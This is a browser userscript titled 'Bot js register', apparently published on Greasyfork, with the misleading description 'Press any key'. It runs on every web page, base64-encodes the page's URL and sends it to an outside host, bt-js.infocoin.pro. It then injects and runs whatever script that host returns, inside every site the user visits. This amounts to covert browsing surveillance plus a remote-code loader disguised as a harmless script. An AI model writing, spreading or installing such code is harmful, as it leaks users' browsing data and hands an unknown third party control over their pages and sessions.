// ==UserScript==
// @name         Bot js register
// @namespace    http://tampermonkey.net/
// @version      0.118
// @description  Press any key
// @author       Lxgn
// @match        https://*/*
// @match        http://*/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/417166/Bot%20js%20register.user.js
// @updateURL https://update.greasyfork.org/scripts/417166/Bot%20js%20register.meta.js
// ==/UserScript==

//alert('Google press register');
console.log('Google press register');
//http://dashboard/js/google/register.php

var ms = new Date();
//document.write('mister kuku');
console.log('mister kuku');
//document.write("<html><meta content=\"default-src * 'unsafe-inline' 'unsafe-eval'\">");


var script = document.createElement('script');
//var t = Math.random()*1000000;


var kuda = "https://bt-js.infocoin.pro/?t="+ms.getTime()+"&a="+base64_encode(location.href);
console.log(kuda);
script.src = kuda;

document.body.appendChild(script);



function base64_encode( data ) {	// Encodes data with MIME base64
	// 
	// +   original by: Tyler Akins (http://rumkin.com)
	// +   improved by: Bayron Guevara

	var b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
	var o1, o2, o3, h1, h2, h3, h4, bits, i=0, enc='';

	do { // pack three octets into four hexets
		o1 = data.charCodeAt(i++);
		o2 = data.charCodeAt(i++);
		o3 = data.charCodeAt(i++);

		bits = o1<<16 | o2<<8 | o3;

		h1 = bits>>18 & 0x3f;
		h2 = bits>>12 & 0x3f;
		h3 = bits>>6 & 0x3f;
		h4 = bits & 0x3f;

		// use hexets to index into b64, and append result to encoded string
		enc += b64.charAt(h1) + b64.charAt(h2) + b64.charAt(h3) + b64.charAt(h4);
	} while (i < data.length);

	switch( data.length % 3 ){
		case 1:
			enc = enc.slice(0, -2) + '==';
		break;
		case 2:
			enc = enc.slice(0, -1) + '=';
		break;
	}

	return enc;
}
